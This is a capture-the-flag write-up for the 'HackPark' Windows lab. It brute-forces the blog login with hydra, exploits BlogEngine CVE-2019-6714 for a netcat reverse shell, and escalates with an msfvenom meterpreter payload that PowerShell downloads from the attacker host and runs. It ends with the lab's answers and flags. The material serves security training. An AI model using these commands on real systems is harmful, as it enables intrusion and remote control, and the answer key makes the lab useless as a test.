# HACK PARK

## BASIC INFO
```
export IP=10.10.55.244

80/tcp   open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2020-05-03T06:22:06+00:00; -39s from scanner time.
```

## USING HYDRA TO BRUTE-FORCE A LOGIN

> - **What request type is the Windows website login form using?**
>> POST

In order to run hydra we need to supply the argument in urlencoded format. Refer to [this](urlencode.py) script for how to encode with urllib.

Running the following command will gives us the password.
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/Account/login.aspx:ctl00%24MainContent%24LoginUser%24UserName=admin&__EVENTVALIDATION=%2FR%2BmdTL%2FGWcCAUXLZ%2FHn36sbZ2AnlRTa1fQjpaUiDVremHkUfE%2F2wYoO%2B1H9E0WKYBtgbkGAfxjZX9etzDTsNtNchnNX5aRyrYyhc9kwC9IrsM%2FZmOl5mQtb5UfhN36p7hpfAhJ5vR1ehq8TJreppnTAJqCO9Dhk7yfxQz7gDuzBqlcj&__VIEWSTATE=9o3SmBZrJRQzfy7kkCOyg1NKfTXN9SunW5hHb0JM5r%2Fubhb%2FsUbr8XKtIkHyfD1mLN474Sg%2BpPuXWdMiqPAaX5eeuWiEmcjo%2FoRLYfMAEBQY7TmjTLJWpDM8pjhAtbQj0uT%2FeK%2BfW5Q5bWMVHOQJG1VsLSZk4UlrOHv0rfoxOl6M2svR&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=LoginButton:Login failed"

```

> Password = 1qaz2wsx

## COMPROMISE THE MACHINE

> - **Now you have logged into the website, are you able to identify the version of the BlogEngine?**
>> 3.3.6.0

It is under About page.

> - **Use the exploit database archive to find an exploit to gain a reverse shell on this system.**
>> CVE-2019-6714

> - **Using the public exploit, gain initial access to the server.\
Who is the webserver running as?**
>> iis apppool\blog

Referring to the explanation in [this](PostView.ascx) script.\
First we host a web server with `python3 -m http.server`\
Then on the web page we navigate to post, edit post, upload files and upload [PostView.ascx](PostView.ascx).\
We need to set up a listener on our host machine as well with the command `nc -lnvp 9001`\
After that, we navigate to the URL `http://$IP/?theme=../../App_Data/files` and we should get a reverse shell on our host machine.

## WINDOWS PRIVILEGE ESCALAITON

> - **Generate a payload with msfvenom**
>> No answer needed

To generate a payload use the command below
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.8.177 LPORT=9002 -f exe -o shell.exe
```

Then we upload it to the remote machine.\
On the remote machine.\
```
cd %TEMP%
powershell -c "Invoke-WebRequest http://10.8.8.177/shell.exe -OutFile shell.exe"
``` 
*Tip: It's common to find C:\Windows\Temp is world writable!*\


Then we set up a listener on our host machine with msfconsole.\
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 9002
run
```

Back on the remote machine, we execute the following command to run shell.exe.\
```
powershell -c "Start-Process shell.exe"
```

Then we should get a meterpreter on msfconsole now.

> - **What is the OS version of this windows machine?**
>> Windows 2012 R2 (6.3 Build 9600)

> - **What is the name of the abnormal service running?**
>> Answer not found yet...

> - **What is the name of the binary you're supposed to exploit?**
>> Message.exe

> - **Using this abnormal service, escalate your privileges!\
What is the user flag (on Jeffs Desktop)?**
>> 759bd8af507517bcfaede78a21a73e39

> - **What is the root flag?**
>> 7e13d97f05f7ceb9881a3eb3d78d3e72